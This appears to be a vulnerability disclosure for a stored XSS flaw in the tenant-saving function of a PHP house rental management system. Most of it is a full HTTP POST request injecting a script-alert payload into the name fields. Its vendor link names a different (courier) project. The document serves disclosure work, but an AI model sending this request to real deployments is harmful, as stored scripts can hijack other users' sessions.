### **Best House Rental Management System XSS Vulnerability**

- **Exploit Title**: Best House Rental Management System Project in PHP XSS Vulnerability  
- **Exploit Author**: Yasser Alshammari
- **Vendor Homepage**: [SourceCodester](https://www.sourcecodester.com/php/17375/best-courier-management-system-project-php.html)  
- **Software Link**: [Download Here](https://www.sourcecodester.com/download-code?nid=17375&title=Best+house+rental+management+system+project+in+php+)  
- **Version**: Best House Rental Management System Project in PHP v1.0  
- **Tested On**: Apache/2.4.54 (Win64) OpenSSL/1.1.1p PHP/8.1.12  
- **CVE**: Reported, waiting for CVE number  

---

### **Description**

The `save_tenant` function in `admin_class.php` of the **Best House Rental Management System Project in PHP v1.0** is vulnerable to a stored Cross-Site Scripting (XSS) attack. This occurs because the `firstname` and `lastname` parameters are not properly sanitized, allowing an attacker to inject malicious JavaScript into the application. This script is executed when the tenants' page (`/rental/index.php?page=tenants`) is accessed by any user.

---

### **Payload Used**

```http
POST /rental/ajax.php?action=save_tenant HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------3178982332774785074212688258
Content-Length: 1032
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/rental/index.php?page=tenants
Cookie: PHPSESSID=dknlqepm8oojar1k1bfeioo8gu
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0

-----------------------------3178982332774785074212688258
Content-Disposition: form-data; name="id"


-----------------------------3178982332774785074212688258
Content-Disposition: form-data; name="lastname"

<script>alert('XSS')</script>
-----------------------------3178982332774785074212688258
Content-Disposition: form-data; name="firstname"

<script>alert('XSS')</script>
-----------------------------3178982332774785074212688258
Content-Disposition: form-data; name="middlename"

Attacker
-----------------------------3178982332774785074212688258
Content-Disposition: form-data; name="email"

test@test.com
-----------------------------3178982332774785074212688258
Content-Disposition: form-data; name="contact"

Attacker
-----------------------------3178982332774785074212688258
Content-Disposition: form-data; name="house_id"

12
-----------------------------3178982332774785074212688258
Content-Disposition: form-data; name="date_in"

12
-----------------------------3178982332774785074212688258--